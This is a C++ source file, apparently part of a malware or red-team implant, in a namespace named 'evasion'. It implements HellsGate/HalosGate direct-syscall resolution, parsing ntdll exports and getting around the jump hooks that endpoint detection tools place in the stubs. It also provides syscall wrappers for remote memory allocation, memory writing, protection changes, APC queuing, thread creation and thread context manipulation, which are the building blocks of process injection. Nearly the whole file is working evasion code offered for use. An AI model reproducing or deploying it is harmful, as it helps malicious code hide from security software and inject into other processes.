#include "Syscalls.h"
#include <winternl.h>
#include <algorithm>

namespace evasion {

SyscallResolver& SyscallResolver::GetInstance() {
    static SyscallResolver instance;
    return instance;
}

SyscallResolver::SyscallResolver() {
    ResolveAll();
}

void SyscallResolver::ResolveAll() {
    // Get ntdll base address from PEB
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + exportDirRVA);

    PDWORD namePtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfNames);
    PDWORD addrPtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfFunctions);
    PWORD ordPtr = (PWORD)((BYTE*)hNtdll + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hNtdll + namePtr[i]);
        if (name[0] == 'Z' && name[1] == 'w') { // Zw functions share SSNs with Nt
            // Logic to find SSN
            PBYTE funcAddr = (PBYTE)hNtdll + addrPtr[ordPtr[i]];
            
            // Search for: mov eax, SSN (0xB8)
            // HellsGate: find SSN directly from stub
            DWORD ssn = 0;
            bool found = false;

            // Look for 'mov eax, SSN' pattern: 4C 8B D1 B8 SSN_LOW SSN_HIGH 00 00
            // Or just B8 SSN_LOW SSN_HIGH 00 00
            for (int offset = 0; offset < 32; offset++) {
                if (funcAddr[offset] == 0xB8) { // mov eax, imm32
                    ssn = *(DWORD*)&funcAddr[offset + 1];
                    found = true;
                    break;
                }
                
                // HalosGate: If we hit a jump (EDR hook), look at neighboring functions
                if (funcAddr[offset] == 0xE9) { // jmp
                    // Check up and down for unhooked neighbors
                    for (int idx = 1; idx < 10; idx++) {
                        // Check neighbor above
                        PBYTE neighborUpper = funcAddr - (idx * 32); 
                        if (neighborUpper[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborUpper[4]) + idx;
                            found = true;
                            break;
                        }
                        // Check neighbor below
                        PBYTE neighborLower = funcAddr + (idx * 32);
                        if (neighborLower[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborLower[4]) - idx;
                            found = true;
                            break;
                        }
                    }
                }
                if (found) break;
            }

            if (found) {
                std::string ntName = name;
                ntName[0] = 'N'; ntName[1] = 't';
                m_syscallMap[ntName] = ssn;
                
                // Find a syscall gadget if we haven't already
                if (!m_syscallGadget) {
                    for (int g = 0; g < 64; g++) {
                        if (funcAddr[g] == 0x0F && funcAddr[g+1] == 0x05 && funcAddr[g+2] == 0xC3) {
                            m_syscallGadget = (PVOID)(funcAddr + g);
                        }
                    }
                }
            }
        }
    }
}

DWORD SyscallResolver::GetServiceNumber(const std::string& functionName) {
    if (m_syscallMap.count(functionName)) {
        return m_syscallMap[functionName];
    }
    return 0xFFFFFFFF;
}

PVOID SyscallResolver::GetSyscallGadget() {
    return m_syscallGadget;
}

NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtAllocateVirtualMemory");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(UINT_PTR)AllocationType, (PVOID)(UINT_PTR)Protect, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtWriteVirtualMemory");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtProtectVirtualMemory");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, RegionSize, (PVOID)(UINT_PTR)NewProtect, OldProtect, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtQueueApcThreadEx");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    // NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
    return InternalDoSyscall(ssn, ThreadHandle, UserApcReserveHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtResumeThread");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ThreadHandle, SuspendCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtSuspendThread");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ThreadHandle, PreviousSuspendCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtGetContextThread");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ThreadHandle, ThreadContext, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtCreateThreadEx");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ThreadHandle, (PVOID)DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, (PVOID)(UINT_PTR)CreateFlags, (PVOID)ZeroBits, (PVOID)StackSize, (PVOID)MaximumStackSize, AttributeList);
}

NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtSetContextThread");
    if (ssn == 0xFFFFFFFF) return 0xC0000001;
    return InternalDoSyscall(ssn, ThreadHandle, ThreadContext, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}

} // namespace evasion
